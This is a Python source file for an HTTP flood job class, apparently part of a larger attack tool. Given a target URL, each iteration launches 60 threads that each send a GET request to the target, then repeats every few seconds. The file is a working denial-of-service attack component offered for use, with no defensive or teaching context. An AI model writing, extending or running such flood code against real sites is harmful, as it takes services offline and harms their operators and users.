import threading
import time
from jobs.abstract_job import AbstractJob
from services.service_http import ServiceHttp
from injectable import injectable, autowired, Autowired


@injectable
class JobAttackHttpFlood(AbstractJob):
    @autowired
    def __init__(self, service_http: Autowired(ServiceHttp)):
        super().__init__()
        self.service_http = service_http
        self.target_url = None

    def set_target(self, target_url: str):
        self.target_url = target_url

    def clean_target(self):
        self.set_target(None)

    def launch_attack_in_thread(self, thread_index: int):
        print('JobAttackHttpFlood.launch_attack_in_thread(): Started thread ' + str(thread_index))
        self.service_http.http_get(self.target_url, headers=self.service_http.get_header(), timeout=6)
        print('JobAttackHttpFlood.launch_attack_in_thread(): Finished thread ' + str(thread_index))

    def job_iteration(self):
        print('JobAttackHttpFlood.job_iteration(): Started')

        # Early stop if invalid IP present
        if self.target_url is None:
            print('JobAttackHttpFlood.job_iteration(): Target URL was set invalid ' + str(self.target_url))
            self.stop()
            return

        # Launch separate threads with attacks
        for thread_index in range(0, 60):
            thread = threading.Thread(target=self.launch_attack_in_thread, args=[thread_index])
            thread.start()
        time.sleep(3)

        print('JobAttackHttpFlood.job_iteration(): Finished')
